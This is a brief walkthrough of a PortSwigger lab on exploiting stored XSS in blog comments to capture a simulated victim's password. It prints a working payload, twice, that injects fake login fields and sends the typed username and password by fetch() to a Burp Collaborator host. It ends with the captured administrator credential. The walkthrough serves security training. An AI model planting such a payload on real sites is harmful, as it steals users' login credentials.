# Exploiting cross-site scripting to capture passwords

## This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

### HINT:

```JAVAscript
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

copy url from burp collector
`ep75t4w1tercstb86rqmfggttkzbn1bq.oastify.com`

```javascript
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://ep75t4w1tercstb86rqmfggttkzbn1bq.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

go to burp collector click on pull now and click on http
administrator:a2c2v3g6cpcxjowbulv6

login and lab solved
